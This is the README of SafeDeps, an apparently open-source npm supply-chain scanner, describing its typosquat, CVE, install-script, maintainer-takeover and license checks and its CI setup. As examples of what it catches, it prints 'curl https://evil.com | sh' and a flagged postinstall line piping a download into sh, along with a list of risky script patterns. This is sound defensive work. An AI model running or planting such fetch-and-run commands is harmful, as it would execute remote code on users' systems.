<div align="center">

<img src="https://img.shields.io/badge/version-1.2.1-blue?style=for-the-badge" alt="version"/>
<img src="https://img.shields.io/badge/license-AGPL--v3-green?style=for-the-badge" alt="license"/>
<img src="https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen?style=for-the-badge" alt="node"/>
<img src="https://img.shields.io/badge/PRs-welcome-orange?style=for-the-badge" alt="PRs welcome"/>

# 🛡️ SafeDeps

### Open source npm package security scanner — catch supply chain attacks before they catch you.

[Features](#-features) · [Installation](#-installation) · [Usage](#-usage) · [How It Works](#-how-it-works) · [Roadmap](#-roadmap) · [Contributing](#-contributing) · [License](#-license)

</div>

---

## 🚨 Why SafeDeps?

In 2025, four major npm supply chain attack campaigns compromised hundreds of packages — including household names like `chalk`, `debug`, and `nx` — with a combined **2.6 billion weekly downloads**. The Shai-Hulud worm alone spread silently to 500+ packages before detection.

**`npm audit` missed all of it.**

`npm audit` only checks known CVEs. It cannot detect:
- A typosquatting package (`lodahs` instead of `lodash`)
- A legitimate package hijacked by a compromised maintainer account
- A GPL dependency quietly embedded in your commercial MIT project
- A package abandoned for 3 years with a single anonymous maintainer
- A postinstall script that quietly runs `curl https://evil.com | sh`

**SafeDeps fills that gap — for free, forever.**

```bash
$ npx safedeps scan

  SafeDeps v1.2.0 — scanning 142 dependencies...

  ✗  CRITICAL  lodahs@1.0.2        Typosquatting — did you mean "lodash"?
  ✗  HIGH      axios@0.21.1        CVE-2023-45857 — CSRF vulnerability (fix: 1.6.0)
  ✗  HIGH      some-pkg@2.1.0      postinstall: curl https://example.com | sh
  ⚠  MEDIUM    left-pad@1.3.0      Maintainer score: 12/100 — abandoned since 2020
  ⚠  MEDIUM    some-util@2.1.0     License: GPL-3.0 conflicts with your MIT project
  ✓  OK        express@4.18.2      No issues found

  Summary: 2 critical · 2 high · 2 medium · 138 clean
```

---

## ✨ Features

### 🔍 Typosquatting Detection
Compares every package name in your `package.json` against the top 5,000 most-downloaded npm packages using multiple detection methods:
- **Levenshtein + Soundex** — character edits and phonetic matches (`recat` → `react`)
- **Homoglyph** — Unicode lookalike substitutions (Cyrillic `а` instead of Latin `a`)
- **Separator substitution** — `bodyparser` → `body-parser`
- **Combosquat** — legitimate names with added prefixes/suffixes (`node-lodash`, `lodash-utils`)

Findings are enriched with npm download counts, package age, and version history to automatically dismiss legitimate packages with high adoption.

### 🛡️ CVE Vulnerability Scanning
Cross-references all dependencies — including transitive dependencies from `package-lock.json` — against:
- [OSV.dev](https://osv.dev) — Google's Open Source Vulnerabilities database
- [GitHub Advisory Database](https://github.com/advisories) — community-maintained advisories

Uses a single batch POST to `/v1/querybatch` (one network request for all packages), then fetches full details per advisory. Outputs CVSS score, affected range, fix version, and advisory links.

### 🚨 Install Script Auditing
Reads every `preinstall`, `install`, and `postinstall` lifecycle script from `node_modules` and flags:
- **High risk** — scripts containing `curl`, `wget`, `eval()`, `node -e`, `child_process`, shell scripts, Windows exec commands, or hard-coded URLs
- **Medium risk** — `preinstall` hooks (run before the package is verified), or suspiciously long scripts
- **Informational** — all other install scripts (e.g. `node-gyp rebuild`)

Fully offline — no network calls required.

### 👤 Maintainer Health Score
Pulls live data from the npm registry and GitHub API to generate a **0–100 trust score** for each package:

| Signal | Weight |
|--------|--------|
| Days since last publish | 30% |
| Number of maintainers | 20% |
| Maintainer account age | 20% |
| GitHub repository activity | 15% |
| Open issues / star ratio | 10% |
| Popularity (stars) | 5% |

Score < 30 → HIGH RISK. Score 30–69 → MEDIUM. Score ≥ 70 → LOW.

### ⚠️ Maintainer Takeover Detection
Compares the previous version's publisher (`_npmUser.name`) against the current `maintainers[]` list. Flags when a new publisher appears on a popular package — the signature of supply chain attacks like `event-stream` (2018) and `ua-parser-js` (2021).

- **High takeover risk** — popular package (≥ 1,000 stars) + publisher changed + published ≤ 30 days ago
- **Medium takeover risk** — publisher changed + published ≤ 90 days ago

A 15-point score penalty is applied on popular packages with a changed publisher.

### 📦 Abandoned Package Detection
Flags packages not published in 2+ years, classified by severity:
- **High** — abandoned AND repo is archived or has no GitHub link
- **Medium** — abandoned but GitHub repo still appears active

Zero extra network calls — reuses data fetched by the maintainer health scanner.

### ⚖️ License Compliance Checker
Maps every dependency's SPDX license and flags incompatibilities with your project's chosen license. Catches GPL code embedded in a commercial product.

Supported licenses: MIT, ISC, BSD-2-Clause, BSD-3-Clause, Apache-2.0, GPL-2.0, GPL-3.0, LGPL, AGPL-3.0, Unlicense, CC0.

### 🔄 Dependency Diff (`safedeps diff`)
Compares two published versions of any package and highlights security-relevant changes:
- Publisher identity changes
- Install scripts added, removed, or modified
- Dependencies added, removed, or version-changed

```bash
safedeps diff express@4.18.0 express@4.21.0
```

### 🛡️ Pre-install Guard (`safedeps guard`)
Wraps `npm install` with a security gate. Before any package lands in `node_modules`:
1. Runs a dry-run to determine what would be installed
2. Scans new packages for typosquats and malicious install scripts
3. Prompts for confirmation if risks are found

```bash
safedeps guard some-package          # interactive
safedeps guard some-package --yes    # non-interactive (CI)
```

### 📋 SBOM Generation (`safedeps sbom`)
Generates a [CycloneDX 1.5](https://cyclonedx.org) JSON Software Bill of Materials with:
- PURL for every component (`pkg:npm/<name>@<version>`)
- SPDX license identifier
- SRI integrity hash from `package-lock.json`

```bash
safedeps sbom > sbom.json
safedeps sbom --output sbom.json --include-dev
```

---

## 📦 Installation

### Run without installing (recommended for first use)
```bash
npx safedeps scan
```

### Install globally
```bash
npm install -g safedeps
```

### Install as a dev dependency (for CI/CD)
```bash
npm install --save-dev safedeps
```

---

## 🚀 Usage

### Basic scan
Scans your current project's `package.json` and `package-lock.json`:
```bash
safedeps scan
```

### Scan a specific project
```bash
safedeps scan --path /path/to/your/project
```

### Scan with custom severity threshold
```bash
safedeps scan --severity high
```

### Check a single package before installing
```bash
safedeps check lodash
safedeps check left-pad@1.3.0
```

### Set your project license for compatibility checks
```bash
safedeps scan --license MIT
safedeps scan --license Apache-2.0
```

### Export results to JSON (for CI/CD pipelines)
```bash
safedeps scan --output json > safedeps-report.json
```

### Fail the build on high-risk findings
```bash
safedeps scan --fail-on high
safedeps scan --fail-on critical
```

### Offline mode (typosquat + license only, no network)
```bash
safedeps scan --offline
```

### Verbose mode (links to OSV, NVD, npm, GitHub, SPDX)
```bash
safedeps scan --verbose
```

### Compare two package versions
```bash
safedeps diff lodash@4.17.20 lodash@4.17.21
safedeps diff @nestjs/core@9.0.0 @nestjs/core@10.0.0
```

### Pre-scan before installing
```bash
safedeps guard express
safedeps guard express --yes    # skip confirmation prompt
```

### Generate a CycloneDX SBOM
```bash
safedeps sbom                          # stdout
safedeps sbom --output sbom.json       # write to file
safedeps sbom --include-dev            # include devDependencies
```

---

## 🔧 CI/CD Integration

### GitHub Actions
Add this to `.github/workflows/security.yml`:

```yaml
name: SafeDeps Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: npm ci

      - name: Run SafeDeps scan
        run: npx safedeps scan --fail-on high --output json > safedeps-report.json
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Upload SBOM
        run: npx safedeps sbom --output sbom.json

      - uses: actions/upload-artifact@v4
        with:
          name: security-reports
          path: |
            safedeps-report.json
            sbom.json
```

> **Note:** Set `GITHUB_TOKEN` to get 5,000 GitHub API requests/hour instead of 60. Without it, maintainer health scores degrade gracefully but may show neutral values under heavy parallel CI usage.

### package.json scripts
```json
{
  "scripts": {
    "security": "safedeps scan",
    "security:ci": "safedeps scan --fail-on high --output json",
    "sbom": "safedeps sbom --output sbom.json"
  }
}
```

---

## 🧠 How It Works

```
Your project
    │
    ├── package.json         ← reads declared dependencies
    └── package-lock.json    ← reads resolved versions + full tree
           │
           ▼
    ┌─────────────────────────────────────────────────────┐
    │                   SafeDeps Engine                   │
    │                                                     │
    │  ┌─────────────┐  ┌──────────────────┐              │
    │  │ Typosquat   │  │  CVE Checker     │              │
    │  │ (Levenshtein│  │  OSV.dev batch   │              │
    │  │  Soundex    │  │  API             │              │
    │  │  Homoglyph  │  │                  │              │
    │  │  Combosquat)│  │                  │              │
    │  └─────────────┘  └──────────────────┘              │
    │                                                     │
    │  ┌─────────────┐  ┌──────────────────┐              │
    │  │  License    │  │  Maintainer      │              │
    │  │  Checker    │  │  Health Score    │              │
    │  │  (SPDX)     │  │  (npm + GitHub)  │              │
    │  └─────────────┘  └──────────────────┘              │
    │                                                     │
    │  ┌─────────────┐  ┌──────────────────┐              │
    │  │  Install    │  │  Abandoned +     │              │
    │  │  Script     │  │  Takeover        │              │
    │  │  Auditor    │  │  Detection       │              │
    │  └─────────────┘  └──────────────────┘              │
    │                                                     │
    │                  Risk Aggregator                    │
    └────────────────────┬────────────────────────────────┘
                         │
              ┌──────────┴──────────┐
              │                     │
         Terminal output        JSON output
         (colour-coded)         (for CI/CD)
```

All data sources used are **free and public** — no API keys required for core functionality:

| Data Source | What It Provides | Rate Limit |
|-------------|-----------------|------------|
| [OSV.dev API](https://osv.dev/docs/) | CVE + vulnerability data | 1,000 req/day |
| [npm Registry API](https://github.com/npm/registry/blob/master/docs/REGISTRY-API.md) | Package metadata + maintainer info | No key needed |
| [GitHub REST API](https://docs.github.com/en/rest) | Repository health signals | 60 req/hr (5,000 with token) |

---

## 🗺️ Roadmap

### ✅ v1.0 — Core scanning
- [x] Typosquatting detection (Levenshtein + Soundex)
- [x] CVE scanning (OSV.dev, transitive deps)
- [x] License compliance checker (SPDX)
- [x] Maintainer health score (npm + GitHub)
- [x] JSON output for CI/CD
- [x] `safedeps check <package>` single-package audit
- [x] `--fail-on`, `--offline`, `--verbose`, `--severity` flags

### ✅ v1.1 — Signal depth
- [x] Multi-method typosquat detection (homoglyph, separator, combosquat)
- [x] Multi-signal authenticity scoring (downloads, age, versions, GitHub stars)
- [x] HTTP retry with exponential backoff
- [x] Shared signal registry (cross-detector data reuse, no duplicate API calls)
- [x] CVE range-floor warnings for projects without a lockfile

### ✅ v1.2 — Supply chain firewall
- [x] Install script auditing (offline, 11 high-risk patterns)
- [x] Abandoned package detection
- [x] Maintainer takeover detection
- [x] `safedeps diff <pkg@v1> <pkg@v2>` — version comparison
- [x] `safedeps guard` — pre-install security gate
- [x] `safedeps sbom` — CycloneDX 1.5 SBOM generation

### 🔜 v1.3 — CI hardening
- [ ] Allowlist / `.safedepsrc` config file (ignore known false positives by package name or CVE ID)
- [ ] SARIF output (`--output sarif`) for GitHub Security tab integration
- [ ] `GITHUB_TOKEN` absence warning in CI environments
- [ ] Auto-fix upgrade command in CVE findings (`npm install pkg@fixVersion`)

---

## 📊 Comparison with alternatives

| Feature | npm audit | Snyk | Socket.dev | **SafeDeps** |
|---------|-----------|------|------------|--------------|
| Known CVE detection | ✅ | ✅ | ✅ | ✅ |
| Transitive dep CVEs | ✅ | ✅ | ✅ | ✅ |
| Typosquatting detection | ❌ | ❌ | ✅ | ✅ |
| Homoglyph / combosquat | ❌ | ❌ | Partial | ✅ |
| License compliance | ❌ | 💰 Paid | 💰 Paid | ✅ Free |
| Maintainer health score | ❌ | ❌ | Partial | ✅ |
| Maintainer takeover detection | ❌ | ❌ | ✅ | ✅ |
| Install script auditing | ❌ | ❌ | ✅ | ✅ |
| Abandoned package detection | ❌ | ❌ | ❌ | ✅ |
| Pre-install guard (`guard`) | ❌ | ❌ | ❌ | ✅ |
| Version diff (`diff`) | ❌ | ❌ | ❌ | ✅ |
| CycloneDX SBOM | ❌ | 💰 Paid | ❌ | ✅ Free |
| Offline mode | ❌ | ❌ | ❌ | ✅ |
| Self-hostable | ❌ | ❌ | ❌ | ✅ |
| Open source | ❌ | ❌ | ❌ | ✅ AGPL-3.0 |
| Free for indie devs | ✅ | Limited | Limited | ✅ Always |

---

## 🤝 Contributing

Contributions are what make open source great. All contributions are welcome — bug fixes, new features, documentation, tests, or ideas.

### Getting started

```bash
# Fork the repo, then clone your fork
git clone https://github.com/kumarsainideepak/safedeps.git
cd safedeps/packages/cli

# Install dependencies
npm install

# Run in development mode
npm run dev

# Run tests
npm test

# Build
npm run build
```

### Contribution areas

| Area | Difficulty | Description |
|------|-----------|-------------|
| 🐛 Bug fixes | Easy | Fix issues tagged `bug` on GitHub |
| 📖 Documentation | Easy | Improve README, add examples, fix typos |
| 🌐 New data source | Medium | Integrate additional vulnerability databases |
| 🔍 Detection rules | Medium | Improve typosquatting or scoring algorithms |
| 🎨 Output formatting | Medium | Improve terminal UI |
| ⚡ Performance | Hard | Optimise API batching, add caching layer |
| 🧪 Tests | Medium | Improve test coverage |

### Guidelines
- Open an issue before starting work on a large feature
- Write tests for new detection logic
- Update the CHANGELOG for any changed behaviour
- Keep PRs focused — one feature or fix per PR

---

## 📁 Project Structure

```
safedeps/
├── packages/
│   └── cli/                    ← Core CLI tool
│       ├── bin/
│       │   └── safedeps.ts     ← Entry point
│       ├── src/
│       │   ├── commands/       ← scan, check, diff, guard, sbom, updatePackages
│       │   ├── detectors/      ← typosquat, cve, license, maintainer, installScript, abandoned
│       │   ├── generators/     ← cyclonedx (SBOM)
│       │   ├── reporters/      ← terminal, JSON output
│       │   ├── sources/        ← API clients (OSV, npm registry, GitHub, npm downloads)
│       │   └── utils/          ← lockfileParser, packageParser, packageDiff, signalRegistry, httpRetry
│       ├── data/
│       │   └── top-packages.json   ← Top 5,000 known npm packages (typosquat baseline)
│       └── tests/
├── CHANGELOG.md
└── README.md
```

---

## 🔐 Security Policy

Found a vulnerability in SafeDeps itself? Please **do not** open a public GitHub issue.

Email us at: **kumarsainideepak32@gmail.com**

We follow responsible disclosure and will respond within 48 hours.

---

## 📄 License

SafeDeps is licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)**.

This means:
- ✅ You can use, modify, and distribute this software freely
- ✅ You can use it in your own projects, including commercial ones
- ⚠️ If you modify SafeDeps and run it as a **network service** (e.g. a SaaS product), you must release your modifications under AGPL-3.0
- ⚠️ You must preserve the copyright notice and license in all copies

For commercial licensing (if you need to use SafeDeps without AGPL obligations), contact: **kumarsainideepak32@gmail.com**

See the [LICENSE](LICENSE) file for the full text.

---

<div align="center">

Built with ❤️ by [Deepak Kumar Saini](https://www.linkedin.com/in/deepak-kumar-saini-976ba6223/)

*Inspired by the 2025 npm supply chain attack wave — because `npm audit` wasn't enough.*

</div>
